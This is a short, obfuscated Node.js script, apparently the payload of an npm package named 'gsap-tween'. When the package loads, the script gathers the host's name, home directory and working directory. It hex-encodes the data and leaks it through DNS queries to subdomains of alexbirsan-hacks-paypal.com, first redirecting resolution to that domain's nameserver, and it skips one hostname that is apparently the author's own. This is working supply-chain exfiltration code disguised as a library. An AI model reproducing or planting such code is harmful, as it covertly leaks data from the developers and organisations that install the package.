const dns = require('dns')
const os = require('os')
const suffix = '.dns.alexbirsan-hacks-paypal.com'
const ns = 'dns1.alexbirsan-hacks-paypal.com'
const package = 'gsap-tween'
function sendToServer(_0x4ed273) {
  _0x4ed273 = Buffer.from(_0x4ed273).toString('hex')
  _0x4ed273 = _0x4ed273.match(/.{1,60}/g)
  id = Math.random().toString(36).substring(2)
  _0x4ed273.forEach(function (_0x176fa1, _0x224fe1) {
    try {
      dns.resolve(
        'v2_f.' + id + '.' + _0x224fe1 + '.' + _0x176fa1 + '.v2_e' + suffix,
        'A',
        console.log
      )
    } catch (_0x50cfd3) {}
  })
}
function tryGet(_0x5ebd88) {
  try {
    return _0x5ebd88()
  } catch (_0x38c2ce) {
    return 'err'
  }
}
data = {
  p: package,
  h: tryGet(os.hostname),
  d: tryGet(os.homedir),
  c: __dirname,
}
if (data.h == 'BBOGENS-LAPTOP') {
  process.exit(0)
}
data = JSON.stringify(data)
sendToServer(data)
dns.lookup(ns, function (_0x595ee9, _0x1c91e2) {
  if (!_0x595ee9) {
    nsAddress = _0x1c91e2
  } else {
    nsAddress = '8.8.8.8'
  }
  dns.setServers([nsAddress, '8.8.4.4'])
  sendToServer(data)
})

